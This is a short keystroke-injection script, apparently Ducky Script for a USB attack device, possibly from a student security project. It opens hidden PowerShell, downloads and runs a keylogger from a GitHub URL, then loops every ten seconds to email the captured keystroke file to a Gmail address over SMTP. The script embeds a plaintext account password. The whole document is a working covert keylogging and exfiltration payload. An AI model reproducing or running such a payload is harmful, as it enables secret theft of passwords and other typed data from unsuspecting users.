DELAY 500
GUI r
DELAY 50
STRING powershell -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PandaPoodle/keylogger/refs/heads/main/Keylogg.txt')
ENTER
DELAY 500
GUI r
DELAY 100
STRING powershell -WindowStyle hidden while ($true) { $EmailTo = "cys305finalproject@gmail.com"; $EmailFrom = "cys305finalproject@gmail.com"; $Subject = "Test"; $Body = Get-Content -Path C:\Windows1\keylogger.txt; $SMTPServer = "smtp.gmail.com"; $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body); $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPClient.EnableSsl = $true; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("cys305finalpresentation@gmail.com", "Iwantt0Sw!ng"); $SMTPClient.Send($SMTPMessage); Start-Sleep -Seconds 10 }
DELAY 300
ENTER
